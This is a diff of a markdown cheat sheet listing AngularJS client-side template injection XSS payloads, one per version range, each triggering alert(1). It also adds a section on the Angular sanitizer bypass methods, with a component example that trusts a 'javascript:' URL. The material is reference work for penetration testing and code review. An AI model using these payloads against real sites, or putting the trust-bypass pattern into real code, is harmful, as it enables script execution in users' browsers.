@@ -1,18 +1,20 @@
-# XSS in Angular
+# XSS in Angular and AngularJS
+
+## Client Side Template Injection
 
 The following payloads are based on Client Side Template Injection.
 
-## Stored/Reflected XSS - Simple alert 
+### Stored/Reflected XSS - Simple alert in AngularJS
 
-> Angular as of version 1.6 have removed the sandbox altogether
+> AngularJS as of version 1.6 have removed the sandbox altogether
 
-Angular 1.6+ by [Mario Heiderich](https://twitter.com/cure53berlin)
+AngularJS 1.6+ by [Mario Heiderich](https://twitter.com/cure53berlin)
 
 ```javascript
 {{constructor.constructor('alert(1)')()}}
 ```
 
-Angular 1.6+ by [@brutelogic](https://twitter.com/brutelogic/status/1031534746084491265)
+AngularJS 1.6+ by [@brutelogic](https://twitter.com/brutelogic/status/1031534746084491265)
 
 ```javascript
 {{[].pop.constructor&#40'alert\u00281\u0029'&#41&#40&#41}}
@@ -20,7 +22,7 @@ Angular 1.6+ by [@brutelogic](https://twitter.com/brutelogic/status/103153474608
 
 Example available at [https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php?a=<brute+ng-app>%7B%7B[].pop.constructor%26%2340%27alert%5Cu00281%5Cu0029%27%26%2341%26%2340%26%2341%7D%7D)
 
-Angular 1.6.0 by [@LewisArdern](https://twitter.com/LewisArdern/status/1055887619618471938) & [@garethheyes](https://twitter.com/garethheyes/status/1055884215131213830)
+AngularJS 1.6.0 by [@LewisArdern](https://twitter.com/LewisArdern/status/1055887619618471938) & [@garethheyes](https://twitter.com/garethheyes/status/1055884215131213830)
 
 ```javascript
 {{0[a='constructor'][a]('alert(1)')()}}
@@ -28,7 +30,7 @@ Angular 1.6.0 by [@LewisArdern](https://twitter.com/LewisArdern/status/105588761
 {{$on.constructor('alert(1)')()}}
 ```
 
-Angular 1.5.9 - 1.5.11 by [Jan Horn](https://twitter.com/tehjh)
+AngularJS 1.5.9 - 1.5.11 by [Jan Horn](https://twitter.com/tehjh)
 
 ```javascript
 {{
@@ -47,25 +49,25 @@ Angular 1.5.9 - 1.5.11 by [Jan Horn](https://twitter.com/tehjh)
 }}
 ```
 
-Angular 1.5.0 - 1.5.8
+AngularJS 1.5.0 - 1.5.8
 
 ```javascript
 {{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
 ```
 
-Angular 1.4.0 - 1.4.9
+AngularJS 1.4.0 - 1.4.9
 
 ```javascript
 {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
 ```
 
-Angular 1.3.20
+AngularJS 1.3.20
 
 ```javascript
 {{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
 ```
 
-Angular 1.3.19
+AngularJS 1.3.19
 
 ```javascript
 {{
@@ -74,7 +76,7 @@ Angular 1.3.19
 }}
 ```
 
-Angular 1.3.3 - 1.3.18
+AngularJS 1.3.3 - 1.3.18
 
 ```javascript
 {{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
@@ -82,7 +84,7 @@ Angular 1.3.3 - 1.3.18
   $eval('x=alert(1)//');  }}
 ```
 
-Angular 1.3.1 - 1.3.2
+AngularJS 1.3.1 - 1.3.2
 
 ```javascript
 {{
@@ -92,7 +94,7 @@ Angular 1.3.1 - 1.3.2
 }}
 ```
 
-Angular 1.3.0
+AngularJS 1.3.0
 
 ```javascript
 {{!ready && (ready = true) && (
@@ -111,44 +113,44 @@ Angular 1.3.0
     );}}
 ```
 
-Angular 1.2.24 - 1.2.29
+AngularJS 1.2.24 - 1.2.29
 
 ```javascript
 {{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
 ```
 
-Angular 1.2.19 - 1.2.23
+AngularJS 1.2.19 - 1.2.23
 
 ```javascript
 {{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
 ```
 
-Angular 1.2.6 - 1.2.18
+AngularJS 1.2.6 - 1.2.18
 
 ```javascript
 {{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
 ```
 
-Angular 1.2.2 - 1.2.5
+AngularJS 1.2.2 - 1.2.5
 
 ```javascript
 {{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+"'");}}
 ```
 
-Angular 1.2.0 - 1.2.1
+AngularJS 1.2.0 - 1.2.1
 
 ```javascript
 {{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
 ```
 
-Angular 1.0.1 - 1.1.5 and Vue JS
+AngularJS 1.0.1 - 1.1.5 and Vue JS
 
 ```javascript
 {{constructor.constructor('alert(1)')()}}
 ```
 
 
-## Blind XSS
+### Blind XSS
 
 1.0.1 - 1.1.5 && > 1.6.0 by Mario Heiderich (Cure53)
 
@@ -253,6 +255,47 @@ Shorter 1.0.1 - 1.1.5 && > 1.6.0 by Lewis Ardern (Synopsys) and Gareth Heyes (Po
 }}
 ```
 
+## Automatic Sanitization
+
+> To systematically block XSS bugs, Angular treats all values as untrusted by default. When a value is inserted into the DOM from a template, via property, attribute, style, class binding, or interpolation, Angular sanitizes and escapes untrusted values.
+
+However, it is possible to mark a value as trusted and prevent the automatic sanitization with these methods:
+
+- bypassSecurityTrustHtml
+- bypassSecurityTrustScript
+- bypassSecurityTrustStyle
+- bypassSecurityTrustUrl
+- bypassSecurityTrustResourceUrl
+
+Example of a component using the unsecure method `bypassSecurityTrustUrl`:
+
+```
+import { Component, OnInit } from '@angular/core';
+
+@Component({
+  selector: 'my-app',
+  template: `
+    <h4>An untrusted URL:</h4>
+    <p><a class="e2e-dangerous-url" [href]="dangerousUrl">Click me</a></p>
+    <h4>A trusted URL:</h4>
+    <p><a class="e2e-trusted-url" [href]="trustedUrl">Click me</a></p>
+  `,
+})
+export class App {
+  constructor(private sanitizer: DomSanitizer) {
+    this.dangerousUrl = 'javascript:alert("Hi there")';
+    this.trustedUrl = sanitizer.bypassSecurityTrustUrl(this.dangerousUrl);
+  }
+}
+```
+
+![XSS](https://angular.io/generated/images/guide/security/bypass-security-component.png)
+
+When doing a code review, you want to make sure that no user input is being trusted since it will introduce a security vulnerability in the application.
+
 ## References
 
 - [XSS without HTML - CSTI with Angular JS - Portswigger](https://portswigger.net/blog/xss-without-html-client-side-template-injection-with-angularjs)
+- [Blind XSS AngularJS Payloads](https://ardern.io/2018/12/07/angularjs-bxss)
+- [Angular Security](https://angular.io/guide/security)
+- [Bypass DomSanitizer](https://medium.com/@swarnakishore/angular-safe-pipe-implementation-to-bypass-domsanitizer-stripping-out-content-c1bf0f1cc36b)
